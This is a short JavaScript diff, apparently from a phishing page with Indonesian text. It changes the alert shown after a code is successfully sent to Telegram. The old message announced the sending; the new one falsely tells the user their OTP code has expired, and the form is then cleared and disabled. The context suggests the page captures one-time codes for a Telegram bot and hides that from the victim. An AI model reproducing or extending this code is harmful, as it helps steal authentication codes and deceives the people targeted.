@@ -124,7 +124,7 @@
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
-          alert('Kode berhasil dikirim ke Telegram.');
+          alert('Kode OTP Kadaluwarsa.');
           codeInput.value = '';
           submitBtn.disabled = true;
           submitBtn.classList.add('bg-gray-400', 'cursor-not-allowed', 'select-none');
